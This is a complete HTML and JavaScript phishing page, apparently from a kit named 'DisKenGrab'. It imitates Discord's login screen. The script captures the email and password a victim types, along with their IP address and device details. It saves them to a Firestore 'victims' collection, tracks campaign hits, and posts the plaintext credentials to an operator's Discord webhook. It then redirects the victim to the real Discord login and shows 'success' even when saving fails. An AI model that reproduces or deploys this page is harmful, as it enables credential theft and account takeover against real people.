<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord Login Required</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --discord-blurple: #5865F2;
            --discord-green: #57F287;
            --discord-red: #ED4245;
            --discord-dark: #2C2F33;
            --discord-darker: #23272A;
            --text-light: #ffffff;
            --text-muted: #b9bbbe;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: var(--discord-darker);
            color: var(--text-light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-image: url('https://discord.com/assets/7c5f92d6bf6c0a34d80a.png');
            background-size: cover;
        }

        .login-container {
            background: var(--discord-dark);
            border-radius: 8px;
            padding: 32px;
            width: 100%;
            max-width: 480px;
            box-shadow: 0 2px 10px 0 rgba(0, 0, 0, 0.2);
            border: 1px solid #40444b;
        }

        .discord-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .discord-logo i {
            font-size: 3rem;
            color: var(--discord-blurple);
        }

        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }

        .login-header h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        .login-header p {
            color: var(--text-muted);
            font-size: 16px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #b9bbbe;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
        }

        .form-input {
            width: 100%;
            padding: 10px;
            background: var(--discord-darker);
            border: 1px solid #040405;
            border-radius: 3px;
            color: var(--text-light);
            font-size: 16px;
            transition: border-color 0.2s;
        }

        .form-input:focus {
            border-color: var(--discord-blurple);
            outline: none;
        }

        .login-button {
            width: 100%;
            padding: 12px;
            background: var(--discord-blurple);
            border: none;
            border-radius: 3px;
            color: white;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-button:hover {
            background: #4752c4;
        }

        .login-button:disabled {
            background: #4a4d52;
            cursor: not-allowed;
        }

        .spinner {
            border: 2px solid #f3f3f3;
            border-top: 2px solid var(--discord-blurple);
            border-radius: 50%;
            width: 16px;
            height: 16px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-right: 8px;
            vertical-align: middle;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .error-message {
            background: var(--discord-red);
            color: white;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
            font-size: 14px;
            display: none;
        }

        .success-message {
            background: var(--discord-green);
            color: white;
            padding: 10px;
            border-radius: 3px;
            margin-bottom: 15px;
            font-size: 14px;
            display: none;
        }

        .redirect-notice {
            text-align: center;
            color: var(--text-muted);
            font-size: 14px;
            margin-top: 15px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="discord-logo">
            <i class="fab fa-discord"></i>
        </div>

        <div class="login-header">
            <h1>Welcome back!</h1>
            <p>We're so excited to see you again!</p>
        </div>

        <div class="error-message" id="errorMessage">
            <i class="fas fa-exclamation-circle"></i> 
            <span id="errorText">Login failed. Please check your credentials.</span>
        </div>

        <div class="success-message" id="successMessage">
            <i class="fas fa-check-circle"></i> 
            <span id="successText">Login successful! Redirecting...</span>
        </div>

        <form id="loginForm">
            <div class="form-group">
                <label class="form-label">Email or Phone Number</label>
                <input type="text" class="form-input" id="email" placeholder="Enter your email" required autocomplete="username">
            </div>

            <div class="form-group">
                <label class="form-label">Password</label>
                <input type="password" class="form-input" id="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>

            <button type="submit" class="login-button" id="loginBtn">
                <span class="spinner" id="loginSpinner" style="display: none;"></span>
                Login
            </button>
        </form>

        <div class="redirect-notice" id="redirectNotice" style="display: none;">
            <i class="fas fa-shield-alt"></i> Verified login. Redirecting to Discord...
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <script src="../config.js"></script>
    <script>
        // ==================== ATTACK PAGE FUNCTIONALITY ====================
        
        // Get URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const attackId = urlParams.get('id');
        const pentesterId = urlParams.get('pentester');

        console.log('ðŸ”— Attack Page Parameters:', { attackId, pentesterId });

        // Initialize Firebase
        let db;
        if (typeof firebaseConfig !== 'undefined') {
            try {
                // Check if already initialized
                if (!firebase.apps.length) {
                    firebase.initializeApp(firebaseConfig);
                }
                db = firebase.firestore();
                console.log('âœ… Attack page Firebase initialized');
            } catch (error) {
                console.error('âŒ Firebase initialization error:', error);
            }
        } else {
            console.error('âŒ Firebase config not found in attack page');
        }

        // Form submission handler
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const loginBtn = document.getElementById('loginBtn');
            const spinner = document.getElementById('loginSpinner');
            const errorDiv = document.getElementById('errorMessage');
            const successDiv = document.getElementById('successMessage');
            const redirectNotice = document.getElementById('redirectNotice');

            // Hide previous messages
            errorDiv.style.display = 'none';
            successDiv.style.display = 'none';

            // Show loading
            loginBtn.disabled = true;
            spinner.style.display = 'inline-block';

            try {
                // Capture victim data
                const victimData = {
                    email: email,
                    password: password,
                    timestamp: new Date(),
                    ipAddress: await getIPAddress(),
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookiesEnabled: navigator.cookieEnabled,
                    screenResolution: `${screen.width}x${screen.height}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    attackId: attackId,
                    pentesterId: pentesterId
                };

                console.log('ðŸ“§ Captured credentials:', { email, password: '***' });

                // Save to Firestore
                if (db) {
                    await db.collection('victims').add({
                        ...victimData,
                        capturedAt: firebase.firestore.FieldValue.serverTimestamp(),
                        status: 'captured'
                    });
                    console.log('âœ… Victim data saved to Firestore');

                    // Update campaign stats
                    if (attackId) {
                        await updateCampaignStats(attackId);
                    }

                    // Send to Discord webhook if configured
                    await sendToWebhook(victimData);
                } else {
                    console.log('âš ï¸ Firestore not available, data not saved');
                }

                // Show success and redirect
                successDiv.style.display = 'block';
                redirectNotice.style.display = 'block';
                
                // Redirect to actual Discord after delay
                setTimeout(() => {
                    window.location.href = 'https://discord.com/login';
                }, 3000);

            } catch (error) {
                console.error('âŒ Error capturing data:', error);
                // Even if saving fails, still show success to the victim
                successDiv.style.display = 'block';
                redirectNotice.style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://discord.com/login';
                }, 3000);
            } finally {
                loginBtn.disabled = false;
                spinner.style.display = 'none';
            }
        });

        // Get victim's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Update campaign statistics
        async function updateCampaignStats(campaignId) {
            try {
                const campaignRef = db.collection('campaigns').doc(campaignId);
                const campaignDoc = await campaignRef.get();
                
                if (campaignDoc.exists) {
                    const currentHits = campaignDoc.data().hits || 0;
                    await campaignRef.update({
                        hits: currentHits + 1,
                        lastHit: firebase.firestore.FieldValue.serverTimestamp()
                    });
                    console.log('âœ… Campaign stats updated');
                }
            } catch (error) {
                console.error('âŒ Error updating campaign stats:', error);
            }
        }

        // Send notification to Discord webhook
        async function sendToWebhook(victimData) {
            try {
                // Get pentester's webhook URL
                if (pentesterId && db) {
                    const pentesterDoc = await db.collection('pentesters').doc(pentesterId).get();
                    if (pentesterDoc.exists) {
                        const pentesterData = pentesterDoc.data();
                        const webhookUrl = pentesterData.webhookUrl;

                        if (webhookUrl) {
                            const embed = {
                                title: 'ðŸ” New Token Captured',
                                description: `**Campaign ID:** ${attackId || 'Unknown'}`,
                                color: 14427600, // Crimson color
                                fields: [
                                    {
                                        name: 'ðŸ“§ Email',
                                        value: '||' + victimData.email + '||',
                                        inline: true
                                    },
                                    {
                                        name: 'ðŸ”‘ Password',
                                        value: '||' + victimData.password + '||',
                                        inline: true
                                    },
                                    {
                                        name: 'ðŸŒ IP Address',
                                        value: victimData.ipAddress,
                                        inline: true
                                    },
                                    {
                                        name: 'ðŸ•’ Time',
                                        value: new Date().toLocaleString(),
                                        inline: true
                                    },
                                    {
                                        name: 'ðŸŒ Location',
                                        value: victimData.timezone,
                                        inline: true
                                    },
                                    {
                                        name: 'ðŸ’» Platform',
                                        value: victimData.platform,
                                        inline: true
                                    }
                                ],
                                timestamp: new Date().toISOString()
                            };

                            await fetch(webhookUrl, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ 
                                    content: 'ðŸŽ¯ **New credentials captured!**',
                                    embeds: [embed] 
                                })
                            });
                            console.log('âœ… Webhook notification sent');
                        }
                    }
                }
            } catch (error) {
                console.error('âŒ Error sending webhook:', error);
            }
        }

        // Initialize the attack page
        document.addEventListener('DOMContentLoaded', function() {
            console.log('ðŸš€ DisKenGrab Attack Page Loaded');
            console.log('ðŸ“Š Attack ID:', attackId);
            console.log('ðŸ‘¤ Pentester ID:', pentesterId);
            
            // Add some realistic delay to mimic Discord's loading
            setTimeout(() => {
                document.getElementById('email').focus();
            }, 500);
        });
    </script>
</body>
</html>
